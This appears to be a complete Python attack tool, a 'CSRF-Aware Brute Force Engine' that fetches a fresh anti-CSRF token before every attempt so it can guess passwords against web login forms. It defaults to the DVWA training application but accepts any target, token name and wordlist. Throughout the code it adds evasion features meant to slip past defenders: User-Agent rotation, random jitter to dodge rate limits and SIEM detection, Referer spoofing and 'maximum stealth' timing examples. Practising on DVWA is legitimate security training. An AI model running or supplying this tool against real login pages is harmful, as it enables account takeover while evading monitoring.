#!/usr/bin/env python3
"""
CSRF-Aware Brute Force Engine
==============================
A penetration testing tool that bypasses Anti-CSRF token mechanisms
to perform authenticated brute-force attacks against login forms.

Target: DVWA (Damn Vulnerable Web Application) or similar CSRF-protected forms.
Framework Alignment: MITRE ATT&CK T1110.001 (Brute Force: Password Guessing)

AUTHORIZED USE ONLY - Ensure written permission before testing.

Algorithm Steps Implemented:
  1. Session Initialization & State Management
  2. Dynamic Data Retrieval (GET Reconnaissance)
  3. DOM Parsing (Token Extraction)
  4. Payload Construction
  5. Execution & Evasion (Jitter, UA Rotation)
  6. Response Analysis
  7. Reset & Loop (Token Invalidation + Re-fetch)
"""

import requests
import re
import sys
import time
import random
import argparse
import logging
from datetime import datetime
from typing import Optional, Tuple
from urllib.parse import urljoin

# ============================================================================
# OPSEC: User-Agent Rotation Pool
# Mimics legitimate browser traffic to evade simple rate-limit filters
# and SOC/SIEM signature-based detection (MITRE ATT&CK T1036.005)
# ============================================================================
USER_AGENTS = [
    # Chrome on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    # Firefox on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) "
    "Gecko/20100101 Firefox/126.0",
    # Chrome on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    # Safari on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    # Edge on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    # Firefox on Linux
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    # Chrome on Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
]


def setup_logging(verbose: bool = False) -> logging.Logger:
    """Configure structured logging for operational audit trail."""
    logger = logging.getLogger("csrf_brute")
    logger.setLevel(logging.DEBUG if verbose else logging.INFO)

    # Console handler with color-coded output
    console = logging.StreamHandler(sys.stdout)
    console.setLevel(logging.DEBUG if verbose else logging.INFO)
    fmt = logging.Formatter(
        "\033[90m[%(asctime)s]\033[0m %(message)s",
        datefmt="%H:%M:%S"
    )
    console.setFormatter(fmt)
    logger.addHandler(console)

    return logger


# ============================================================================
# STEP 1: Session Initialization & State Management
# ============================================================================
# Rationale: Establish a persistent HTTP session that automatically manages
# cookies (PHPSESSID). This maintains server-side state across requests,
# which is CRITICAL because CSRF tokens are bound to the session.
# Without session persistence, each request would generate a new session
# and the extracted token would be invalid.
# ============================================================================

def init_session(
    target_url: str,
    proxy: Optional[str] = None,
    logger: Optional[logging.Logger] = None
) -> requests.Session:
    """
    STEP 1: Initialize a persistent HTTP session with the target.

    Creates a requests.Session object that:
    - Automatically stores and sends PHPSESSID cookies
    - Maintains TCP connection keep-alive for performance
    - Optionally routes through a proxy (Burp Suite, mitmproxy)

    OpSec Note: Proxy support enables traffic inspection and replay
    through tools like Burp Suite for validation.

    Args:
        target_url: Base URL of the target application
        proxy: Optional HTTP proxy (e.g., "http://127.0.0.1:8080")
        logger: Logger instance

    Returns:
        Configured requests.Session with initial cookies set
    """
    session = requests.Session()

    # Configure proxy for traffic interception if specified
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
        # Disable SSL verification when proxying (Burp uses self-signed certs)
        session.verify = False
        if logger:
            logger.debug(f"  Proxy configured: {proxy}")

    # Set initial headers to appear as a legitimate browser
    session.headers.update({
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    })

    # Perform initial connection to receive session cookie (PHPSESSID)
    try:
        init_response = session.get(target_url, timeout=10)
        init_response.raise_for_status()

        if logger:
            cookies = dict(session.cookies)
            logger.info(
                f"\033[32m[STEP 1]\033[0m Session initialized | "
                f"Status: {init_response.status_code} | "
                f"Cookies: {cookies}"
            )

    except requests.RequestException as e:
        if logger:
            logger.error(f"\033[31m[STEP 1 FAIL]\033[0m Connection failed: {e}")
        raise SystemExit(f"[!] Cannot reach target: {e}")

    return session


# ============================================================================
# STEP 2 & 3: Dynamic Data Retrieval + DOM Parsing
# ============================================================================
# Rationale: CSRF tokens are single-use cryptographic nonces embedded in
# the HTML form. We must fetch a fresh page (GET) before each login attempt
# to obtain a valid token. The token is then extracted via regex or HTML
# parsing from the hidden input field.
#
# Why Regex over BeautifulSoup here: For a known, stable DOM structure
# (like DVWA), regex is faster and has zero external dependencies.
# For complex/dynamic DOMs, BeautifulSoup would be preferred.
# ============================================================================

def fetch_csrf_token(
    session: requests.Session,
    login_url: str,
    token_name: str = "user_token",
    logger: Optional[logging.Logger] = None
) -> str:
    """
    STEP 2 + 3: Fetch the login page and extract the fresh CSRF token.

    Step 2 - Sends GET request to retrieve HTML containing the token.
    Step 3 - Parses the DOM to extract the token value using regex.

    The regex pattern targets:
        <input type="hidden" name="user_token" value="CSRF_TOKEN_HERE">

    OpSec Consideration: Each GET request mimics normal browsing behavior.
    Fetching the page before each login attempt is indistinguishable from
    a legitimate user refreshing the page after a failed login.

    Args:
        session: Active requests.Session with valid cookies
        login_url: URL of the login form
        token_name: Name attribute of the hidden CSRF input field
        logger: Logger instance

    Returns:
        Extracted CSRF token string

    Raises:
        ValueError: If token cannot be found in the response
    """
    # STEP 2: GET request to fetch fresh HTML
    try:
        response = session.get(login_url, timeout=10)
        response.raise_for_status()
    except requests.RequestException as e:
        if logger:
            logger.error(f"\033[31m[STEP 2 FAIL]\033[0m GET failed: {e}")
        raise

    if logger:
        logger.debug(
            f"\033[36m[STEP 2]\033[0m Page fetched | "
            f"Status: {response.status_code} | "
            f"Size: {len(response.text)} bytes"
        )

    # STEP 3: DOM Parsing - Extract token via regex
    # Pattern explanation:
    #   name=['"]?{token_name}['"]?  -> matches the token field name
    #   value=['"]?([a-fA-F0-9]+)    -> captures the hex token value
    pattern = rf"""<input\s+[^>]*name\s*=\s*['"]?{re.escape(token_name)}['"]?\s+[^>]*value\s*=\s*['"]?([a-fA-F0-9]+)['"]?"""

    match = re.search(pattern, response.text, re.IGNORECASE)

    if not match:
        # Fallback: try reversed attribute order (value before name)
        alt_pattern = rf"""<input\s+[^>]*value\s*=\s*['"]?([a-fA-F0-9]+)['"]?\s+[^>]*name\s*=\s*['"]?{re.escape(token_name)}['"]?"""
        match = re.search(alt_pattern, response.text, re.IGNORECASE)

    if not match:
        if logger:
            logger.error(
                f"\033[31m[STEP 3 FAIL]\033[0m Token '{token_name}' "
                f"not found in response body"
            )
        raise ValueError(
            f"CSRF token '{token_name}' not found. "
            "The form structure may have changed."
        )

    token = match.group(1)

    if logger:
        logger.debug(
            f"\033[36m[STEP 3]\033[0m Token extracted | "
            f"{token_name}={token[:8]}...{token[-4:]}"
        )

    return token


# ============================================================================
# STEP 4: Payload Construction
# ============================================================================
# Rationale: Assemble the POST body by combining:
#   - The fresh CSRF token (from Step 3)
#   - The current username/password attempt (from wordlist)
#   - Static form parameters (e.g., Login=Login)
# This payload must exactly replicate what the browser would send.
# ============================================================================

def build_payload(
    username: str,
    password: str,
    csrf_token: str,
    token_name: str = "user_token",
    extra_params: Optional[dict] = None
) -> dict:
    """
    STEP 4: Construct the POST payload with credentials and CSRF token.

    Replicates the exact form submission a legitimate browser would send.
    The payload structure must match the server's expected parameter names
    and values, or the request will be rejected.

    DVWA expected parameters:
        username=<user>&password=<pass>&Login=Login&user_token=<token>

    Args:
        username: Current username attempt
        password: Current password attempt
        csrf_token: Fresh CSRF token from Step 3
        token_name: CSRF token parameter name
        extra_params: Additional form fields (e.g., {"Login": "Login"})

    Returns:
        Dictionary representing the POST body
    """
    payload = {
        "username": username,
        "password": password,
        token_name: csrf_token,
    }

    # Add static form parameters (e.g., submit button value)
    if extra_params:
        payload.update(extra_params)
    else:
        # DVWA default: Login button parameter
        payload["Login"] = "Login"

    return payload


# ============================================================================
# STEP 5: Execution & Evasion
# ============================================================================
# Rationale: Send the crafted payload via POST. OpSec measures include:
#   - User-Agent rotation to evade fingerprinting
#   - Random jitter between requests to avoid rate-limit triggers
#   - Referer header spoofing to appear as organic navigation
# These techniques map to MITRE ATT&CK:
#   T1036.005 - Masquerading: Match Legitimate Name or Location
#   T1071.001 - Application Layer Protocol: Web Protocols
# ============================================================================

def execute_attempt(
    session: requests.Session,
    login_url: str,
    payload: dict,
    jitter_range: Tuple[float, float] = (0.5, 2.0),
    rotate_ua: bool = True,
    logger: Optional[logging.Logger] = None
) -> requests.Response:
    """
    STEP 5: Execute the login attempt with evasion techniques.

    Sends the POST request while implementing OpSec measures:
    1. User-Agent Rotation: Randomly selects from a pool of legitimate
       browser UA strings to defeat signature-based detection.
    2. Jitter/Delay: Introduces random delays between requests to avoid
       triggering rate-limit or anomaly-detection rules.
    3. Referer Spoofing: Sets the Referer header to the login page URL,
       mimicking organic browser navigation flow.

    Args:
        session: Active session with cookies
        login_url: Target login endpoint
        payload: POST body from Step 4
        jitter_range: (min, max) seconds of random delay
        rotate_ua: Whether to rotate User-Agent headers
        logger: Logger instance

    Returns:
        Server's HTTP response object
    """
    # Evasion: Random delay to avoid triggering rate-limit alarms
    delay = random.uniform(*jitter_range)
    if logger:
        logger.debug(f"\033[33m[STEP 5]\033[0m Jitter delay: {delay:.2f}s")
    time.sleep(delay)

    # Evasion: Rotate User-Agent to evade fingerprinting
    if rotate_ua:
        ua = random.choice(USER_AGENTS)
        session.headers["User-Agent"] = ua

    # Evasion: Spoof Referer to appear as organic navigation
    session.headers["Referer"] = login_url

    # Execute POST
    try:
        response = session.post(
            login_url,
            data=payload,
            allow_redirects=False,  # Capture 302 redirects for analysis
            timeout=10
        )
    except requests.RequestException as e:
        if logger:
            logger.error(f"\033[31m[STEP 5 FAIL]\033[0m POST failed: {e}")
        raise

    if logger:
        logger.debug(
            f"\033[33m[STEP 5]\033[0m POST sent | "
            f"Status: {response.status_code} | "
            f"Size: {len(response.text)} bytes"
        )

    return response


# ============================================================================
# STEP 6: Response Analysis
# ============================================================================
# Rationale: Determine if the login attempt succeeded by analyzing:
#   1. HTTP status codes (302 = redirect to dashboard = SUCCESS)
#   2. Response body content (absence of failure string = SUCCESS)
#   3. HTTP 403 = account lockout or WAF block (ABORT)
#
# This is the decision point that determines whether to continue
# the brute-force loop or halt with a success.
# ============================================================================

def analyze_response(
    response: requests.Response,
    failure_string: str = "Login failed",
    success_path: str = "/dashboard",
    logger: Optional[logging.Logger] = None
) -> bool:
    """
    STEP 6: Analyze the server's response to determine success/failure.

    Success indicators:
    - HTTP 302 redirect to an authenticated endpoint (e.g., /dashboard)
    - Absence of the failure string in the response body
    - Presence of success indicators (e.g., "Welcome", "Logout")

    Failure indicators:
    - Failure string present in response body
    - HTTP 403 (Forbidden) - may indicate WAF/rate-limit block
    - HTTP 200 with the login form still present

    Args:
        response: HTTP response from the POST attempt
        failure_string: Text that indicates a failed login
        success_path: URL path that indicates successful authentication
        logger: Logger instance

    Returns:
        True if login succeeded, False if failed
    """
    status = response.status_code

    # Check for WAF/rate-limit block
    if status == 403:
        if logger:
            logger.warning(
                "\033[31m[STEP 6]\033[0m HTTP 403 received - "
                "possible WAF block or account lockout"
            )
        return False

    # Check for redirect to authenticated area (strong success signal)
    if status in (301, 302):
        location = response.headers.get("Location", "")
        if success_path in location:
            if logger:
                logger.info(
                    f"\033[32m[STEP 6]\033[0m Redirect to {location} - "
                    f"SUCCESS INDICATOR"
                )
            return True

    # Analyze response body for failure/success strings
    body = response.text

    # Check for explicit failure
    if failure_string.lower() in body.lower():
        return False

    # If no failure string found AND we got a 200, check for success indicators
    # (The page loaded but doesn't show an error = potential success)
    if status == 200 and failure_string.lower() not in body.lower():
        # Additional heuristic: check if we're now on an authenticated page
        success_indicators = ["logout", "sign out", "welcome", "dashboard"]
        for indicator in success_indicators:
            if indicator.lower() in body.lower():
                if logger:
                    logger.info(
                        f"\033[32m[STEP 6]\033[0m Success indicator "
                        f"'{indicator}' found in response body"
                    )
                return True

    return False


# ============================================================================
# STEP 7: Reset & Loop (Main Attack Loop)
# ============================================================================
# Rationale: Orchestrates the full attack cycle. After each failed attempt:
#   1. Discard the used (now invalid) CSRF token from memory
#   2. Return to Step 2 to fetch a fresh token via GET
#   3. Continue with the next password from the wordlist
#
# The token MUST be refreshed because CSRF tokens in secure implementations
# are single-use (nonce). Reusing a consumed token will result in a
# server-side rejection, causing every subsequent attempt to fail.
# ============================================================================

def load_wordlist(filepath: str) -> list:
    """
    Load password wordlist from file.

    Handles common encoding issues and strips whitespace.
    Skips empty lines and comments (lines starting with #).

    Args:
        filepath: Path to the wordlist file

    Returns:
        List of password strings
    """
    passwords = []
    try:
        with open(filepath, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                pwd = line.strip()
                if pwd and not pwd.startswith("#"):
                    passwords.append(pwd)
    except FileNotFoundError:
        raise SystemExit(f"[!] Wordlist not found: {filepath}")
    except PermissionError:
        raise SystemExit(f"[!] Permission denied: {filepath}")

    return passwords


def run_attack(
    target_url: str,
    login_path: str,
    username: str,
    wordlist_path: str,
    token_name: str = "user_token",
    failure_string: str = "Login failed",
    success_path: str = "/dashboard",
    jitter_range: Tuple[float, float] = (0.5, 2.0),
    rotate_ua: bool = True,
    proxy: Optional[str] = None,
    verbose: bool = False,
    output_file: Optional[str] = None,
) -> Optional[str]:
    """
    STEP 7: Main attack orchestrator - Reset & Loop.

    Implements the complete attack cycle:
        INIT -> [GET page -> Extract token -> Build payload ->
                 POST login -> Analyze -> Reset token] -> LOOP

    This function coordinates all 7 steps in sequence, handling:
    - Token refresh after each attempt (single-use nonce invalidation)
    - Wordlist iteration
    - Success/failure reporting
    - Graceful error handling and retry logic

    Args:
        target_url: Base URL (e.g., "http://192.168.1.100")
        login_path: Login endpoint path (e.g., "/vulnerabilities/brute/")
        username: Target username to brute-force
        wordlist_path: Path to password wordlist file
        token_name: CSRF token parameter name
        failure_string: String indicating failed login
        success_path: URL path indicating successful auth
        jitter_range: (min, max) jitter delay in seconds
        rotate_ua: Enable User-Agent rotation
        proxy: Optional proxy URL
        verbose: Enable debug logging
        output_file: Optional file to write results

    Returns:
        The cracked password if found, None otherwise
    """
    logger = setup_logging(verbose)
    login_url = urljoin(target_url.rstrip("/") + "/", login_path.lstrip("/"))

    # Banner
    logger.info("=" * 65)
    logger.info("\033[1;35m  CSRF-Aware Brute Force Engine\033[0m")
    logger.info("\033[1;35m  MITRE ATT&CK: T1110.001 | Cyber Kill Chain: Exploitation\033[0m")
    logger.info("=" * 65)
    logger.info(f"  Target     : {login_url}")
    logger.info(f"  Username   : {username}")
    logger.info(f"  Wordlist   : {wordlist_path}")
    logger.info(f"  Token Name : {token_name}")
    logger.info(f"  Jitter     : {jitter_range[0]:.1f}s - {jitter_range[1]:.1f}s")
    logger.info(f"  UA Rotation: {'Enabled' if rotate_ua else 'Disabled'}")
    logger.info(f"  Proxy      : {proxy or 'None'}")
    logger.info("=" * 65)

    # Load wordlist
    passwords = load_wordlist(wordlist_path)
    total = len(passwords)
    logger.info(f"\033[36m[*]\033[0m Loaded {total} passwords from wordlist")

    if total == 0:
        logger.error("[!] Wordlist is empty. Aborting.")
        return None

    # ---- STEP 1: Session Initialization ----
    logger.info("\033[32m[STEP 1]\033[0m Initializing session...")
    session = init_session(target_url, proxy=proxy, logger=logger)

    start_time = datetime.now()
    cracked_password = None

    # ---- STEP 7: Main Loop ----
    for attempt, password in enumerate(passwords, 1):
        logger.info(
            f"\033[34m[{attempt}/{total}]\033[0m "
            f"Trying: \033[1m{username}\033[0m : \033[1m{password}\033[0m"
        )

        try:
            # ---- STEP 2 + 3: Fetch page & Extract token ----
            # Token is refreshed EVERY iteration because CSRF tokens
            # are single-use nonces that are invalidated after consumption
            csrf_token = fetch_csrf_token(
                session, login_url,
                token_name=token_name, logger=logger
            )

            # ---- STEP 4: Payload Construction ----
            payload = build_payload(
                username=username,
                password=password,
                csrf_token=csrf_token,
                token_name=token_name
            )
            logger.debug(
                f"\033[33m[STEP 4]\033[0m Payload built | "
                f"Params: {list(payload.keys())}"
            )

            # ---- STEP 5: Execution & Evasion ----
            response = execute_attempt(
                session, login_url, payload,
                jitter_range=jitter_range,
                rotate_ua=rotate_ua,
                logger=logger
            )

            # ---- STEP 6: Response Analysis ----
            success = analyze_response(
                response,
                failure_string=failure_string,
                success_path=success_path,
                logger=logger
            )

            if success:
                elapsed = (datetime.now() - start_time).total_seconds()
                cracked_password = password

                logger.info("")
                logger.info("=" * 65)
                logger.info(
                    f"\033[1;32m  [SUCCESS] Password found!\033[0m"
                )
                logger.info(f"  Username : {username}")
                logger.info(f"  Password : {password}")
                logger.info(f"  Attempts : {attempt}/{total}")
                logger.info(f"  Duration : {elapsed:.1f}s")
                logger.info("=" * 65)

                # Write results to file if specified
                if output_file:
                    with open(output_file, "a") as f:
                        f.write(
                            f"[{datetime.now().isoformat()}] "
                            f"{username}:{password} "
                            f"({attempt} attempts, {elapsed:.1f}s)\n"
                        )
                    logger.info(f"  Results written to: {output_file}")

                return cracked_password

            # ---- STEP 7 (Reset): Discard used token ----
            # The token variable goes out of scope here and will be
            # re-fetched in the next iteration. This is critical because
            # the server has already consumed/invalidated this token.
            del csrf_token
            logger.debug(
                "\033[90m[STEP 7]\033[0m Token invalidated, "
                "returning to Step 2 for fresh token"
            )

        except ValueError as e:
            # Token extraction failed - page structure may have changed
            logger.warning(f"\033[33m[!]\033[0m Token error: {e}")
            logger.info("    Retrying with fresh session...")
            session = init_session(target_url, proxy=proxy, logger=logger)
            continue

        except requests.RequestException as e:
            # Network error - retry with backoff
            logger.warning(f"\033[33m[!]\033[0m Network error: {e}")
            logger.info("    Backing off for 5 seconds...")
            time.sleep(5)
            continue

    # Wordlist exhausted without success
    elapsed = (datetime.now() - start_time).total_seconds()
    logger.info("")
    logger.info("=" * 65)
    logger.info(f"\033[1;31m  [EXHAUSTED] Wordlist complete - no valid password found\033[0m")
    logger.info(f"  Attempts : {total}")
    logger.info(f"  Duration : {elapsed:.1f}s")
    logger.info("=" * 65)

    return None


# ============================================================================
# CLI Interface
# ============================================================================

def parse_args() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="CSRF-Aware Brute Force Engine for Penetration Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic DVWA brute force
  python3 csrf_brute.py -t http://192.168.1.100 -u admin -w passwords.txt

  # With proxy (Burp Suite) and verbose output
  python3 csrf_brute.py -t http://192.168.1.100 -u admin -w passwords.txt \\
      --proxy http://127.0.0.1:8080 -v

  # Custom token name, failure string, and output file
  python3 csrf_brute.py -t http://target.local -u admin -w rockyou.txt \\
      --token-name csrf_token --failure "Invalid credentials" -o results.txt

  # Aggressive timing (faster, less stealthy)
  python3 csrf_brute.py -t http://192.168.1.100 -u admin -w passwords.txt \\
      --jitter-min 0.1 --jitter-max 0.5

  # Maximum stealth (slower, harder to detect)
  python3 csrf_brute.py -t http://192.168.1.100 -u admin -w passwords.txt \\
      --jitter-min 3.0 --jitter-max 10.0
        """
    )

    # Required arguments
    parser.add_argument(
        "-t", "--target",
        required=True,
        help="Target base URL (e.g., http://192.168.1.100)"
    )
    parser.add_argument(
        "-u", "--username",
        required=True,
        help="Target username to brute-force"
    )
    parser.add_argument(
        "-w", "--wordlist",
        required=True,
        help="Path to password wordlist file"
    )

    # Optional arguments
    parser.add_argument(
        "-p", "--path",
        default="/vulnerabilities/brute/",
        help="Login endpoint path (default: /vulnerabilities/brute/)"
    )
    parser.add_argument(
        "--token-name",
        default="user_token",
        help="CSRF token parameter name (default: user_token)"
    )
    parser.add_argument(
        "--failure",
        default="Login failed",
        help='Failure indicator string (default: "Login failed")'
    )
    parser.add_argument(
        "--success-path",
        default="/dashboard",
        help="Success redirect path (default: /dashboard)"
    )
    parser.add_argument(
        "--jitter-min",
        type=float,
        default=0.5,
        help="Minimum jitter delay in seconds (default: 0.5)"
    )
    parser.add_argument(
        "--jitter-max",
        type=float,
        default=2.0,
        help="Maximum jitter delay in seconds (default: 2.0)"
    )
    parser.add_argument(
        "--no-ua-rotate",
        action="store_true",
        help="Disable User-Agent rotation"
    )
    parser.add_argument(
        "--proxy",
        help="HTTP proxy URL (e.g., http://127.0.0.1:8080)"
    )
    parser.add_argument(
        "-o", "--output",
        help="Output file for results"
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose/debug output"
    )

    return parser.parse_args()


def main():
    """Entry point."""
    args = parse_args()

    print("\n\033[1;31m" + "=" * 65)
    print("  ⚠  AUTHORIZED PENETRATION TESTING USE ONLY")
    print("  Unauthorized access to computer systems is illegal.")
    print("=" * 65 + "\033[0m\n")

    result = run_attack(
        target_url=args.target,
        login_path=args.path,
        username=args.username,
        wordlist_path=args.wordlist,
        token_name=args.token_name,
        failure_string=args.failure,
        success_path=args.success_path,
        jitter_range=(args.jitter_min, args.jitter_max),
        rotate_ua=not args.no_ua_rotate,
        proxy=args.proxy,
        verbose=args.verbose,
        output_file=args.output,
    )

    sys.exit(0 if result else 1)


if __name__ == "__main__":
    main()
